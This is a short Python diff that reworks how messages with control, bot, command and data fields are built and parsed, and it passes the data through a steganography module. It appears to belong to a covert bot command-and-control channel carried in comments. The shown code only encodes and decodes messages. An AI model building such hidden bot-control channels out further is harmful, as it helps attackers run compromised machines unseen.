@@ -2,7 +2,6 @@ import os
 import re
 import json
 from enum import Enum
-import base64
 import stegano
 
 INITIALIZED = False
@@ -51,18 +50,19 @@ def construct_message(isctrl, bot, cmd, data, respond):
         + str(int(isctrl)) + DELIM \
         + str(bot) + DELIM \
         + cmd.name + DELIM \
-        + data + DELIM \
+        + stegano.text_to_base64(data) + DELIM \
         + str(int(respond)) + DELIM
 
 
-def parse_message(comment):
+def parse_message(msg):
     try:
-        isctrl, bot, cmd, d, r = comment.split(DELIM)[1:6]
+        isctrl, bot, cmd, data, r = msg.split(DELIM)[1:6]
         isctrl = bool(int(isctrl))
         bot = int(bot)
         cmd = Command[cmd]
+        data = stegano.base64_to_text(data)
         r = bool(int(r))
-        return True, isctrl, bot, cmd, d, r
+        return True, isctrl, bot, cmd, data, r
     
     except:
         return False, None, None, None, None, None
